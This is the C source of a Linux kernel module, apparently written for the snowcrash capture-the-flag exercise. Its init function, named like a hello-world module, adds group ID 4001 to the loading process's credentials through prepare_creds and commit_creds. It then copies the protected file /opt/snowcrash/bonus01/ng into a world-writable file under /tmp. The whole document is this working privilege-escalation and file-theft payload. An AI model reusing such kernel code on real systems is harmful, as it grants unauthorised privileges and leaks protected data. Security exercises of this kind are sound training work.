#include <linux/init.h> /* Needed for the macros */
#include <linux/module.h> /* Needed by all modules */
#include <linux/printk.h> /* Needed for pr_info() */
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/cred.h>

static int __init hello_init(void)
{		
	struct cred* new;
	struct group_info* groups;

	new = prepare_creds();
	if (!new)
		return (1);

	groups = groups_alloc(new->group_info->ngroups + 1);
	if (!groups)
	{
		abort_creds(new);
		return (1);
	}
	
	for (int i = 0; i < new->group_info->ngroups; ++i)
		groups->gid[i] = new->group_info->gid[i];

	groups->gid[new->group_info->ngroups] = make_kgid(current_user_ns(), 4001);

	groups_sort(groups);

	new->group_info = groups;
	commit_creds(new);

	struct file* file = filp_open("/tmp/test_out", O_WRONLY | O_CREAT | O_TRUNC, S_IRWXU | S_IRWXG | S_IRWXO);
	if (IS_ERR(file))
		return (1);

	struct file* file_ng = filp_open("/opt/snowcrash/bonus01/ng", O_RDONLY, 0);
	unsigned long long offset = 0;
	unsigned long long offset_ng = 0;

	if (IS_ERR(file_ng))
	{
		kernel_write(file, "KO\n", 3, &offset);
		return (1);
	}

	uint8_t data;
	while(kernel_read(file_ng, &data, 1, &offset_ng) == 1)
	{
		kernel_write(file, &data, 1, &offset);
	}


	filp_close(file_ng, NULL);
	filp_close(file, NULL);
	return (0);
}

static void __exit hello_exit(void)
{
    pr_info("Goodbye, world 2\n");
}

module_init(hello_init);
module_exit(hello_exit);

MODULE_LICENSE("GPL");

